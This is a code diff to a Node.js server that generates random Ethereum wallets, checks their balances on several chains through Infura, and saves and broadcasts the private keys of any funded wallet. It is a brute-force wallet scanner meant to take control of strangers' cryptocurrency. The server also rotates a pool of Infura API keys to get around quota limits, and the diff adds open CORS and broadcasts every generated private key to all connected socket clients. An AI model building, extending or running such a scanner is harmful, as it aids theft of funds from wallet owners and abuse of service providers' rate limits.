@@ -5,6 +5,7 @@ var {log, success, error} = require("./myStd");
 const clc = require("cli-color")
 
 const express = require('express');
+var cors = require('cors');
 const app = express();
 const http = require('http');
 const server = http.createServer(app);
@@ -16,8 +17,8 @@ var RUN = false;
 var DAILY_TIME_RUN = "0:00:00";
 var DAILY_TIME_RUN_FILE = "DAILY_TIME_RUN.txt";
 var socket = null;
-function socket_emit(){
-    if (socket) socket.emit(arguments);
+function ioemit(){
+    if (io) io.emit(arguments);
 }
 function setDailyTimeRun(dailyTime = DAILY_TIME_RUN, file= DAILY_TIME_RUN_FILE){
     DAILY_TIME_RUN = dailyTime;
@@ -58,6 +59,7 @@ timerRun()
 const { DynamoDBClient, CreateTableCommand, DeleteTableCommand, PutItemCommand, ListTablesCommand } = require("@aws-sdk/client-dynamodb");
 
 var INFURA_API_KEYS = [];
+var current_INFURA_API_KEYS_index = 0;
 const INFURA = [
     "https://mainnet.infura.io/v3/",
     "https://polygon-mainnet.infura.io/v3/",
@@ -84,6 +86,7 @@ function loadInfuraAPIKeys(pathToFile ='infurakeys.txt'){
 }
 
 function initWeb3(index = 0) {
+    current_INFURA_API_KEYS_index = index;
     w3 = INFURA.map(link => {
         const provider = new Web3.providers.HttpProvider(link + INFURA_API_KEYS[index]);
         return new Web3(provider);
@@ -167,11 +170,6 @@ const scanWallets = () => {
     if (!RUN) return;
     random_wallet(w3[0]) // {address:'0x550cd530bc893fc6d2b4df6bea587f17142ab64e', privateKey:'aaa'}
         .then(async (a) => {
-            socket_emit('count_query', {
-                count: count_query++,
-                address: a.address,
-                privateKey: a.privateKey,
-            });
             // const params = {
             //     TableName: "addresses",
             //     Item: {
@@ -189,8 +187,17 @@ const scanWallets = () => {
             // });
 
             // check address balance in multichain
+            
             /* check balane */
-            return w3.map(web3 => {
+            return w3.map((web3, web3Index) => {
+                ioemit('count_query', {
+                    count: count_query++,
+                    address: a.address,
+                    privateKey: a.privateKey,
+                    current_INFURA_API_KEYS_index: current_INFURA_API_KEYS_index,
+                    chain: w3[web3Index],
+                });
+                log(a.address);
                 return web3.eth.getBalance(a.address).then(balance => {
                     // log(balance);
                     if (balance >= 1e18) {
@@ -220,7 +227,7 @@ const scanWallets = () => {
                         client.send(new PutItemCommand(params)).then(resultG => {
                             // log(resultG["$metadata"].httpStatusCode == 200);
                         });
-                        socket_emit('goodWallets', {
+                        ioemit('goodWallets', {
                             address: a.address,
                             privateKey: a.privateKey,
                             balance: balance,
@@ -238,14 +245,14 @@ const scanWallets = () => {
                             // when all keys exceeded, set time run again next day
 
                             RUN = false;
-                            socket_emit("count_query", { error: `get balance error: ${err.message} - ${INFURA_API_KEYS[w3.keyIndex]}` , RUN: false });
+                            ioemit("count_query", { error: `get balance error: ${err.message} - ${INFURA_API_KEYS[w3.keyIndex]}` , RUN: false });
                         } else {
                             initWeb3(w3.keyIndex + 1);
                         }
                         error("w3 api key: ", INFURA_API_KEYS[w3.keyIndex]);
                     }else {
                         RUN = false;
-                        socket_emit("count_query", { error: "get balance error: " + err.message, RUN: false });                          
+                        ioemit("count_query", { error: "get balance error: " + err.message, RUN: false });                          
                     }
                 })
             });
@@ -261,9 +268,9 @@ const scanWallets = () => {
 
 /* server */
 
-var PORT = 3000;
+var PORT = 3001;
 
-app.use(express.static('public'));
+app.use(cors());
 
 io.on('connection', async (_socket) => {
     socket = _socket
@@ -297,7 +304,7 @@ io.on('connection', async (_socket) => {
                 break;
         }
         socket.emit("DAILY_TIME_RUN", {"DAILY_TIME_RUN": DAILY_TIME_RUN})
-    })
+    });
 
     socket.on("INFURA_API_KEYS", (msg) => {
         if (msg.message)
